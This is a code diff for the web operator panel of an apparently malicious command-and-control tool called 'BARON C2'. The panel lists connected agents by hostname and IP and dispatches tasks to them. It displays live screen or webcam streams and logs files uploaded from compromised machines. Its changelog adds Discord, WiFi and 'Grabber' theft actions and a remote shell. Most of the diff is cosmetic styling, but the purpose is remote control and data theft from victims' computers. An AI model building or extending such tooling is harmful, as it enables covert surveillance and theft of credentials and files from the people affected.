@@ -171,34 +171,91 @@
         }
 
         /* -----------------------------------------------------
-           Dynamic Island (Top Notch)
+           Dynamic Island (Liquid Glass)
         ----------------------------------------------------- */
         .dynamic-island {
             position: fixed; top: 15px; left: 50%; transform: translateX(-50%);
-            background: #000; border-radius: 40px;
-            height: 40px; width: 200px;
+            background: linear-gradient(135deg, rgba(255,255,255,0.08) 0%, rgba(255,255,255,0.02) 50%, rgba(255,255,255,0.06) 100%);
+            backdrop-filter: blur(40px) saturate(180%);
+            -webkit-backdrop-filter: blur(40px) saturate(180%);
+            border-radius: 40px;
+            height: 44px; min-width: 220px; max-width: 500px;
             display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05);
-            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border: 1px solid rgba(255,255,255,0.12);
+            box-shadow:
+                0 8px 32px rgba(0,0,0,0.4),
+                inset 0 1px 0 rgba(255,255,255,0.15),
+                inset 0 -1px 0 rgba(0,0,0,0.1),
+                0 0 0 0.5px rgba(255,255,255,0.08);
+            transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             z-index: 1000; overflow: hidden; cursor: pointer;
+            padding: 0 20px;
         }
-        .dynamic-island:hover { width: 300px; }
+        .dynamic-island::before {
+            content: ''; position: absolute; inset: 0;
+            border-radius: inherit;
+            background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.04) 50%, transparent 70%);
+            animation: liquid-shimmer 4s ease-in-out infinite;
+        }
+        @keyframes liquid-shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .dynamic-island:hover {
+            min-width: 340px;
+            box-shadow:
+                0 12px 40px rgba(0,0,0,0.5),
+                inset 0 1px 0 rgba(255,255,255,0.2),
+                0 0 20px var(--accent-glow);
+        }
+        .dynamic-island.island-alert {
+            min-width: 360px;
+            border-color: var(--accent);
+            box-shadow: 0 8px 40px var(--accent-glow), inset 0 1px 0 rgba(255,255,255,0.15);
+            animation: island-glow 0.5s ease;
+        }
+        .dynamic-island.island-danger {
+            border-color: var(--danger);
+            box-shadow: 0 8px 40px rgba(255,51,102,0.3), inset 0 1px 0 rgba(255,255,255,0.15);
+        }
+        .dynamic-island.island-success {
+            border-color: var(--success);
+            box-shadow: 0 8px 40px rgba(0,230,118,0.25), inset 0 1px 0 rgba(255,255,255,0.15);
+        }
+        @keyframes island-glow {
+            0% { transform: translateX(-50%) scale(1); }
+            50% { transform: translateX(-50%) scale(1.05); }
+            100% { transform: translateX(-50%) scale(1); }
+        }
         .island-content {
             display: flex; align-items: center; gap: 10px;
-            font-size: 0.85rem; font-weight: 500; font-family: var(--font-mono);
+            font-size: 0.82rem; font-weight: 500; font-family: var(--font-mono);
+            position: relative; z-index: 1; white-space: nowrap;
+        }
+        .island-icon {
+            font-size: 0.9rem; color: var(--accent);
+            transition: color 0.3s;
         }
         .island-dot {
             width: 8px; height: 8px; border-radius: 50%;
             background: var(--success);
             box-shadow: 0 0 10px var(--success);
             animation: pulse 2s infinite;
+            flex-shrink: 0;
         }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        .island-badge {
+            background: var(--accent); color: #000;
+            font-size: 0.65rem; font-weight: 800;
+            padding: 2px 7px; border-radius: 10px;
+            margin-left: 4px;
+        }
 
         /* Expanded Island State */
         .dynamic-island.expanded {
-            width: 400px; height: 120px; border-radius: 24px;
+            min-width: 420px; height: 140px; border-radius: 24px;
             align-items: flex-start; padding: 20px;
+            flex-direction: column;
         }
 
         /* -----------------------------------------------------
@@ -375,6 +432,76 @@
         .theme-btn.ruby { color: #ff4757; }
         .theme-btn.gold { color: #D4AF37; }
 
+        /* -----------------------------------------------------
+           Result Modal (Full Output Viewer)
+        ----------------------------------------------------- */
+        .result-overlay {
+            position: fixed; inset: 0; z-index: 50000;
+            background: rgba(0,0,0,0.7); backdrop-filter: blur(8px);
+            display: none; align-items: center; justify-content: center;
+            opacity: 0; transition: opacity 0.3s;
+        }
+        .result-overlay.active { display: flex; opacity: 1; }
+        .result-modal {
+            width: 90%; max-width: 800px; max-height: 80vh;
+            background: rgba(8,8,16,0.95); backdrop-filter: blur(40px);
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
+            box-shadow: 0 40px 80px rgba(0,0,0,0.8);
+            display: flex; flex-direction: column;
+            animation: modalIn 0.3s ease;
+        }
+        @keyframes modalIn {
+            0% { opacity: 0; transform: scale(0.95) translateY(20px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        .result-header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 20px 24px; border-bottom: 1px solid rgba(255,255,255,0.08);
+        }
+        .result-header h3 { font-size: 1rem; color: var(--accent); letter-spacing: 1px; }
+        .result-close {
+            width: 32px; height: 32px; border-radius: 50%;
+            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+            color: #fff; font-size: 1rem; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            transition: 0.3s;
+        }
+        .result-close:hover { background: var(--danger); border-color: var(--danger); }
+        .result-body {
+            flex: 1; overflow-y: auto; padding: 20px 24px;
+            font-family: var(--font-mono); font-size: 0.85rem;
+            color: var(--success); line-height: 1.6;
+            white-space: pre-wrap; word-break: break-all;
+        }
+
+        /* Screen Viewer Overlay */
+        .screen-overlay {
+            position: fixed; inset: 0; z-index: 49000;
+            background: rgba(0,0,0,0.85);
+            display: none; align-items: center; justify-content: center;
+            flex-direction: column;
+        }
+        .screen-overlay.active { display: flex; }
+        .screen-overlay img {
+            max-width: 90vw; max-height: 80vh;
+            border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
+        }
+        .screen-bar {
+            display: flex; gap: 15px; align-items: center;
+            margin-top: 15px; padding: 10px 20px;
+            background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
+            border-radius: 30px; border: 1px solid rgba(255,255,255,0.1);
+        }
+        .screen-bar button {
+            background: var(--danger); color: #fff; border: none;
+            padding: 8px 20px; border-radius: 20px; cursor: pointer;
+            font-weight: 700; font-family: var(--font-sans);
+            transition: 0.3s;
+        }
+        .screen-bar button:hover { transform: scale(1.05); }
+        .screen-bar span { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-muted); }
+
     </style>
 </head>
 <body>
@@ -404,11 +531,13 @@
     <!-- Main Workspace (Desktop) -->
     <div id="workspace">
         
-        <!-- Dynamic Island -->
+        <!-- Dynamic Island (Liquid Glass) -->
         <div class="dynamic-island" id="dynamic-island" onclick="toggleIsland()">
             <div class="island-content">
                 <div class="island-dot"></div>
-                <span id="island-text">System Active</span>
+                <i class="island-icon fa-solid fa-shield-halved"></i>
+                <span id="island-text">BARON C2 ACTIVE</span>
+                <span class="island-badge" id="island-badge">0</span>
             </div>
         </div>
 
@@ -561,6 +690,22 @@
                 </div>
             <div class="win-body">
                 <div class="cl-item">
+                    <div class="cl-version">v3.5 Deep Fix (Liquid Glass)</div>
+                    <div class="cl-date">29 March 2026</div>
+                    <ul class="cl-list">
+                        <li><b>CRITICAL FIX:</b> Agent JSON parser — commands were silently dropped due to whitespace mismatch.</li>
+                        <li><b>Dynamic Island:</b> Liquid Glass effect with reactive states (alert/danger/success).</li>
+                        <li><b>Result Viewer:</b> Full-screen modal auto-opens when command results arrive.</li>
+                        <li><b>Screen Viewer:</b> Live stream overlay with FPS counter and controls.</li>
+                        <li><b>WebSocket Auth:</b> Fixed panel room join — real-time updates now work.</li>
+                        <li><b>Auto-refresh:</b> Client list updates every 10s + WebSocket push.</li>
+                        <li><b>Offline Detection:</b> Agents marked DEAD after 30s (was 5 minutes).</li>
+                        <li><b>Context Menu:</b> Added 6 new actions — Discord, WiFi, Grabber, Shell, SysInfo, Processes.</li>
+                        <li><b>Island Badge:</b> Shows live connected agent count.</li>
+                        <li><b>Log Rendering:</b> Server logs now appear in terminal panel.</li>
+                    </ul>
+                </div>
+                <div class="cl-item">
                     <div class="cl-version">v3.0 Sovereign (God Mode)</div>
                     <div class="cl-date">21 March 2026</div>
                     <ul class="cl-list">
@@ -621,6 +766,28 @@
             </div>
         </div>
 
+    </div>
+
+    <!-- Result Modal -->
+    <div class="result-overlay" id="result-overlay" onclick="if(event.target===this)closeResult()">
+        <div class="result-modal">
+            <div class="result-header">
+                <h3 id="result-title"><i class="fa-solid fa-terminal"></i> COMMAND OUTPUT</h3>
+                <button class="result-close" onclick="closeResult()"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div class="result-body" id="result-body">Waiting for data...</div>
+        </div>
+    </div>
+
+    <!-- Screen Viewer -->
+    <div class="screen-overlay" id="screen-overlay">
+        <img id="screen-img" src="" alt="Live Screen" />
+        <div class="screen-bar">
+            <span id="screen-fps">0 FPS</span>
+            <span id="screen-res">--</span>
+            <button onclick="stopStream()"><i class="fa-solid fa-stop"></i> Stop Stream</button>
+            <button onclick="closeScreenViewer()" style="background:rgba(255,255,255,0.1)"><i class="fa-solid fa-xmark"></i> Close</button>
+        </div>
     </div>
 
     <!-- ---------------------------------------------------
@@ -865,54 +1032,178 @@
         }
 
         // --- 7. Networking & Socket ---
+        let _clientCount = 0;
+        let _streamFrameCount = 0;
+        let _streamFpsTimer = null;
+
         function initSocket() {
             socket = io();
             
             socket.on('connect', () => {
-                // Authenticate and join 'panel' room
                 socket.emit('auth', { token: token });
-                document.getElementById('island-text').innerText = "C2 SECURE UPLINK";
+                islandNotify('shield', 'SECURE UPLINK', 'success');
                 logTerminal("Socket connected to Mainframe.", "succ");
             });
             
             socket.on('auth_ok', data => {
                 logTerminal(`Authenticated as ${data.user}. Real-time updates active.`, "succ");
-                document.querySelector('.island-dot').style.background = "var(--accent)";
+                islandNotify('crown', `${data.user.toUpperCase()} — GOD MODE`, 'success');
             });
 
             socket.on('auth_fail', () => {
+                islandNotify('triangle-exclamation', 'AUTH FAILED', 'danger');
                 logTerminal("WebSocket auth failed! Re-login required.", "err");
             });
             
             socket.on('disconnect', () => {
-                document.getElementById('island-text').innerText = "UPLINK LOST";
-                document.querySelector('.island-dot').style.background = "var(--danger)";
+                islandNotify('plug-circle-xmark', 'UPLINK LOST', 'danger');
                 logTerminal("Socket disconnected.", "err");
             });
 
             socket.on('clients_update', data => {
+                const count = Object.keys(data).length;
+                const online = Object.values(data).filter(c => c.online).length;
+                if(online !== _clientCount) {
+                    _clientCount = online;
+                    updateBadge(online);
+                    if(online > 0) islandNotify('satellite-dish', `${online} AGENT${online>1?'S':''} ONLINE`, 'success');
+                }
                 renderClients(data);
             });
 
             socket.on('client_new', data => {
                 logTerminal(`New agent connected: ${data.hostname} (${data.id?.substring(0,8)}) from ${data.ip}`, 'warn');
-                flashIsland(`NEW AGENT: ${data.hostname}`);
+                islandNotify('user-plus', `NEW: ${data.hostname}`, 'alert', 5000);
                 fetchClients();
             });
 
             socket.on('task_queued', data => {
-                logTerminal(`Task dispatched to ${data.cid?.substring(0,8)}: ${data.task?.action}`, 'info');
+                const action = data.task?.action || '?';
+                logTerminal(`Task dispatched to ${data.cid?.substring(0,8)}: ${action}`, 'info');
+                islandNotify('bolt', `TASK: ${action.toUpperCase()}`, 'alert', 2000);
             });
 
             socket.on('result', data => {
                 const tag = data.type || 'result';
-                const snippet = (data.data || '').substring(0, 500);
-                logTerminal(`[${data.cid?.substring(0,8)}] ${tag}: ${snippet}`, 'succ');
+                const fullData = data.data || '';
+                const snippet = fullData.substring(0, 300);
+                const cid = data.cid?.substring(0,8) || '?';
+                
+                logTerminal(`[${cid}] ${tag}: ${snippet}${fullData.length > 300 ? '...' : ''}`, 'succ');
+                islandNotify('check-circle', `RESULT: ${tag.toUpperCase()}`, 'success', 3000);
+
+                // Auto-open result modal for substantial results
+                if(fullData.length > 10) {
+                    showResult(tag.toUpperCase() + ' — Agent ' + cid, fullData);
+                }
             });
 
             socket.on('stream_frame', data => {
-                // TODO: render screen/webcam frames in modal
+                const img = document.getElementById('screen-img');
+                const overlay = document.getElementById('screen-overlay');
+                
+                if(data.data) {
+                    img.src = 'data:image/jpeg;base64,' + data.data;
+                    _streamFrameCount++;
+                    
+                    if(!overlay.classList.contains('active')) {
+                        overlay.classList.add('active');
+                        islandNotify('tv', 'LIVE STREAM', 'alert');
+                        
+                        // Start FPS counter
+                        if(_streamFpsTimer) clearInterval(_streamFpsTimer);
+                        _streamFpsTimer = setInterval(() => {
+                            document.getElementById('screen-fps').textContent = _streamFrameCount + ' FPS';
+                            _streamFrameCount = 0;
+                        }, 1000);
+                    }
+                }
             });
+
+            socket.on('upload_new', data => {
+                logTerminal(`File uploaded from agent: ${data.filename} (${data.size} bytes)`, 'warn');
+                islandNotify('cloud-arrow-up', `FILE: ${data.filename}`, 'alert', 4000);
+            });
+        }
+
+        // --- 8. Result Modal ---
+        function showResult(title, content) {
+            document.getElementById('result-title').innerHTML = `<i class="fa-solid fa-terminal"></i> ${title}`;
+            document.getElementById('result-body').textContent = content;
+            document.getElementById('result-overlay').classList.add('active');
+        }
+        function closeResult() {
+            document.getElementById('result-overlay').classList.remove('active');
+        }
+
+        // --- 9. Screen Viewer ---
+        function stopStream() {
+            if(selectedClient) {
+                cmd('screen_stop');
+                islandNotify('stop', 'STREAM STOPPED', 'danger', 2000);
+            }
+        }
+        function closeScreenViewer() {
+            document.getElementById('screen-overlay').classList.remove('active');
+            if(_streamFpsTimer) { clearInterval(_streamFpsTimer); _streamFpsTimer = null; }
+        }
+
+        // --- 10. Dynamic Island Reactive System ---
+        let _islandTimer = null;
+        const _islandDefault = { icon: 'shield-halved', text: 'BARON C2 ACTIVE' };
+
+        function islandNotify(icon, text, state='alert', duration=3000) {
+            const isl = document.getElementById('dynamic-island');
+            const txt = document.getElementById('island-text');
+            const ico = document.querySelector('.island-icon');
+            const dot = document.querySelector('.island-dot');
+
+            // Clear previous timer
+            if(_islandTimer) clearTimeout(_islandTimer);
+
+            // Set state class
+            isl.classList.remove('island-alert', 'island-danger', 'island-success');
+            isl.classList.add('island-' + state);
+
+            // Update content
+            ico.className = 'island-icon fa-solid fa-' + icon;
+            txt.textContent = text;
+
+            // Dot color
+            if(state === 'success') {
+                dot.style.background = 'var(--success)';
+                dot.style.boxShadow = '0 0 10px var(--success)';
+            } else if(state === 'danger') {
+                dot.style.background = 'var(--danger)';
+                dot.style.boxShadow = '0 0 10px var(--danger)';
+            } else {
+                dot.style.background = 'var(--accent)';
+                dot.style.boxShadow = '0 0 10px var(--accent-glow)';
+            }
+
+            // Reset after duration
+            _islandTimer = setTimeout(() => {
+                isl.classList.remove('island-alert', 'island-danger', 'island-success');
+                ico.className = 'island-icon fa-solid fa-' + _islandDefault.icon;
+                txt.textContent = _islandDefault.text;
+                dot.style.background = 'var(--success)';
+                dot.style.boxShadow = '0 0 10px var(--success)';
+            }, duration);
+        }
+
+        function updateBadge(count) {
+            const badge = document.getElementById('island-badge');
+            badge.textContent = count;
+            badge.style.display = count > 0 ? 'inline' : 'none';
+        }
+
+        function flashIsland(msg) {
+            islandNotify('bell', msg, 'alert', 4000);
+        }
+
+        function toggleIsland() {
+            const isl = document.getElementById('dynamic-island');
+            isl.classList.toggle('expanded');
         }
 
         // Auto-refresh every 10 seconds
@@ -924,10 +1215,8 @@
             .then(d => {
                 if(d.ok) {
                     renderClients(d.clients);
-                    // Render server logs into terminal
                     if(d.logs && d.logs.length > 0) {
                         const term = document.getElementById('terminal');
-                        // Only render NEW logs (after our last known timestamp)
                         if(!window._lastLogTime) window._lastLogTime = 0;
                         d.logs.forEach(log => {
                             const logTime = log.time || 0;
@@ -946,6 +1235,7 @@
             })
             .catch(() => {});
         }
+
 
         function renderClients(data) {
             const tbody = document.getElementById('clients-body');
@@ -1031,23 +1321,7 @@
             });
         }
 
-        // --- 9. UX Visuals ---
-        function flashIsland(msg) {
-            const isl = document.getElementById('dynamic-island');
-            const txt = document.getElementById('island-text');
-            const old = txt.innerText;
-            isl.style.background = "var(--danger)";
-            txt.innerText = msg;
-            setTimeout(() => {
-                isl.style.background = "#000";
-                txt.innerText = old;
-            }, 3000);
-        }
 
-        function toggleIsland() {
-            const isl = document.getElementById('dynamic-island');
-            isl.classList.toggle('expanded');
-        }
 
     </script>
 </body>
